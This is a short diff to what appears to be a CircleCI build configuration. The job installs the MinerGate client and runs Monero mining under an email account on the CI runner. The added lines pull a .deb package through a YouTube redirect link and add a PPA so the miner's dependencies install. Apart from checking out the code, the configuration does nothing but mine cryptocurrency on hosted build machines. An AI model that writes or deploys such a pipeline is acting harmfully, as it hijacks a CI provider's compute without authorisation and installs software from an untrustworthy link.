@@ -6,5 +6,9 @@ jobs:
       - checkout
       - run:
           command: |
-            sudo apt-get update -yqq && wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb
+            wget https://www.youtube.com/redirect?q=http%3A%2F%2Ffr.archive.ubuntu.com%2Fubuntu%2Fpool%2Fmain%2Fp%2Fpcre3%2Flibpcre16-3_8.38-3.1_amd64.deb&redir_token=tuOftiBEb2KfbOjk7hPryAcKa598MTU0MDgyMzIzN0AxNTQwNzM2ODM3&event=video_description&v=BMb0qUMyqA0
+            sudo add-apt-repository ppa:ubuntu-toolchain-r/test
+            sudo apt-get update -yqq
+            sudo apt-get install libstdc++6 -yqq
+            wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb
             minergate-cli --user yoginth@outlook.in --xmr 8
